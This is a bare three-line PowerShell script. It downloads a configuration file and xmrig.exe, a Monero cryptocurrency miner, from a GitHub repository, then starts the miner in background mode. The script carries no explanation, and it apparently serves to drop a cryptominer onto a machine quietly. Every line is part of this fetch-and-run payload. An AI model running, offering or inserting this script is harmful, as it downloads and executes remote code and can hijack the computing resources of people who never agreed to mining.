Invoke-WebRequest -Uri 'https://github.com/prendibs/s/raw/refs/heads/main/config.json' -OutFile 'config.json'
Invoke-WebRequest -Uri 'https://github.com/prendibs/s/raw/refs/heads/main/xmrig.exe' -OutFile 'xmrig.exe'
.\xmrig -B -c config.json
